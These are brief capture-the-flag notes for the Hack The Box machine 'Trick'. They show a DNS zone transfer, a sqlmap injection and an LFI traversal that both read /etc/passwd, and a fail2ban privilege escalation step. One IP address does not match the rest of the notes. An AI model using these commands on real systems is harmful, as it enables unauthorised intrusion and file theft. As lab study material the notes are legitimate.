# Trick - DNS Zone Transfer

```bash
dig axfr trick.htb @10.10.11.166
```

[image]

## SQL Injection to Read File

1. nginx config file then see other services

```bash
sqlmap -u "http://10.10.10.167/search_products.php" --data "productName=*" --dbms "mysql" --dbs --file-read=/etc/passwd
```

## Find LFI and nginx access log & RCE

```
http://preprod-marketing.trick.htb/index.php?page=….//….//….//etc/passwd
```

## Privilege Escalation

```bash
sudo fail2ban restart
```
